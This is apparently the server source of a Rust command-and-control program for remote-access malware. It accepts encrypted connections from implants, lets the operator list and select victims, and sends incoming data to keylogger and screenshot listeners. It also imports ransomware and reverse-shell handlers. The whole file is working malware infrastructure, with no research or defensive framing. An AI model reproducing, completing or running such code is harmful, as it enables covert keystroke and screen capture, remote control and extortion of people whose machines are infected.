use std::{cmp::min, collections::HashMap, ops::DerefMut, str::from_utf8, sync::Arc, thread};
use active::{connection_handler, ransomware_handler, reverse_shell_handler};
use passive::{keylog_listener, screenshot_listener};
use tokio::{io::{self, AsyncReadExt, AsyncWriteExt}, net::{tcp::OwnedWriteHalf, TcpListener}, runtime::Handle, sync::{mpsc, Mutex}};
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm
};
use shared::{acquire_key, encrypted_write_from_key, ControlCode, ControlPacket, DataPacket, ModuleType, PacketType};

mod active;
mod passive;

struct Connection {
    modules_map: Arc<HashMap::<ModuleType, Mutex<mpsc::Sender<Vec<u8>>>>>,
    writer: Arc<Mutex<OwnedWriteHalf>>,
    key: [u8; 32]
}


const READ_AMOUNT: usize = 5120;

#[allow(unreachable_code)]
#[tokio::main]
async fn main() -> std::io::Result<()>{

    let listener = TcpListener::bind("127.0.0.1:55555").await?;
    println!("Server Running");

    let connection_module_pointers: Arc<Mutex<HashMap<String, Connection>>> = Arc::new(Mutex::new(HashMap::new()));
    let async_handler = tokio::runtime::Handle::current();

    let server_connections = connection_module_pointers.clone();
    //SERVER-SIDE INPUT HANDLER
    async_handler.spawn( async move {
        loop {
            let mut buffer = [0; 1024];
            let n = io::stdin().read(&mut buffer).await?;
            let input = from_utf8(&buffer[..n-2]);
            if input.is_err() {
                io::stdout().write_all(b"Error from input").await?;
            }
            let parts: Vec<&str> = input.unwrap().split(" ").into_iter().collect();
            if parts.len() == 0 {
                continue
            }
            match parts[0] {
                "list" => {
                    let mut count = 0;
                    let mut list = String::new();
                    for c in server_connections.lock().await.keys() {
                        list += &format!("[{}] > {}\n", count, c);
                        count += 1;
                    }
                    io::stdout().write_all(list.as_bytes()).await?;
                    io::stdout().flush().await?;
                }
                "select" => {
                    if parts.len() > 1 {
                        if let Ok(index) = parts[1].parse::<usize>() {
                            let server_connections_lock = server_connections.lock().await;
                            if let Some(key) = server_connections_lock.keys().skip(usize::saturating_sub(index, 1)).next() {
                                if let Some(connection_modules) = server_connections_lock.get(key) {
                                    connection_handler(connection_modules).await?;
                                }   
                            }
 
                            io::stdout().write_all(format!("you selected: {}\r\n", parts[1]).as_bytes()).await?;
                            io::stdout().flush().await?;
                        }
                    }
                }

                _ => ()

            }
        }
        Ok::<(), std::io::Error>(())
    });

    loop {
        let (stream, socketaddr) = listener.accept().await?;
        let (mut stream_read, stream_write) = stream.into_split();
        let stream_write = Arc::new(Mutex::new(stream_write));
        let con_handler_map = connection_module_pointers.clone();
        let _handler = tokio::spawn(async move {
            let key = acquire_key(&mut stream_read, &mut stream_write.lock().await.deref_mut()).await?;
            let cipher = Aes256Gcm::new(&key.into());
            let mut buf = [0; 32];
            let mut present_modules: HashMap::<ModuleType, Mutex<mpsc::Sender<Vec<u8>>>> = HashMap::new(); 
            stream_read.read_exact(&mut buf).await?;
            for num in buf {
                match ModuleType::try_from(num) {
                    Ok(module_type) => {
                        let (sx, rx) = mpsc::channel::<Vec<u8>>(256);
                        present_modules.insert(module_type, Mutex::new(sx));
                            match module_type {
                                ModuleType::KeyLogger => {
                                    tokio::spawn( async move {
                                        let out = keylog_listener(rx, "user").await;
                                        println!("out from keyloger: {:?}", out);
                                    });
                                }
                                ModuleType::Capture => {
                                    tokio::spawn(async move {
                                        let out = screenshot_listener(rx, "user").await;
                                        println!("out from caputre: {:?}", out);
                                    });
                                }

                                _ => ()
                            }
                    }
                    Err(_e) => ()
                }
            }
            let present_modules = Arc::new(present_modules);
            let connection_struct = Connection {
                modules_map: present_modules.clone(),
                writer: stream_write.clone(),
                key
            };
            con_handler_map.lock().await.deref_mut().insert(socketaddr.to_string(), connection_struct);
            println!("Modules Loaded: {:?}", present_modules.keys()); 

            loop {
                let mut buf = [0; READ_AMOUNT];
                let _n = stream_read.read(&mut buf).await?;
                let nonce = &buf[0..12];
                let length = u64::from_be_bytes(buf[12..20].try_into().unwrap());
                let mut ciphertext;
                if length > READ_AMOUNT as u64 -20 {
                    let mut rest_of_data_buffer = vec![0u8; length as usize - READ_AMOUNT + 20];
                    rest_of_data_buffer.clear();
                    let _n = stream_read.read_buf(&mut rest_of_data_buffer).await?;
                    ciphertext = buf[20..].to_vec();
                    ciphertext.extend(rest_of_data_buffer);                        
                } else {
                    ciphertext = buf[20.. length as usize +20].to_vec();
                }
                let plaintext = cipher.decrypt(nonce.into(), ciphertext.as_slice());
                //println!("length of ciphertext: {}, read bytes: {}", length, n);
                if plaintext.is_err() {
                    match plaintext.err() {
                        Some(e) => {
                            println!("{}", e.to_string());
                        }
                        _ => ()
                    }
                    continue
                }
                let plaintext = plaintext.unwrap();
                let packet_type: PacketType = plaintext[0].try_into().unwrap();
                match packet_type {
                    PacketType::Data => {
                        match DataPacket::from_bytes(&plaintext[1..]) {
                            Ok(payload) => {
                                match present_modules.get(&payload.module_type) {
                                    Some(sender) => {
                                        let sender = sender.lock().await;
                                        match sender.send(payload.data).await {
                                            Ok(()) => (),
                                            Err(e) => println!("{}", e)
                                        }
                                    }
                                    None => {
                                        println!("No Module found for recieved packet")
                                    }
                                }
                            }
                            Err(e) => {
                                println!("Error converting to payload: {}", e)
                            }
                        }
                    }
                    PacketType::Control => {
                        match ControlPacket::from_bytes(&plaintext[1..]) {
                            Ok(payload) => {
                                match present_modules.get(&payload.module_type) {
                                    Some(sender) => {
                                        let sender = sender.lock().await;
                                        sender.send(vec![payload.control_code as u8]).await.unwrap();
                                    }
                                    None => {
                                        println!("No Module found for recieved packet")
                                    }
                                }
                            }
                            Err(e) => {
                                println!("Error converting to payload: {}", e)
                            }
                        }
                    }
                }


            }

            
            //println!("byebye");
            Ok::<(), std::io::Error>(())
        });
    }
}
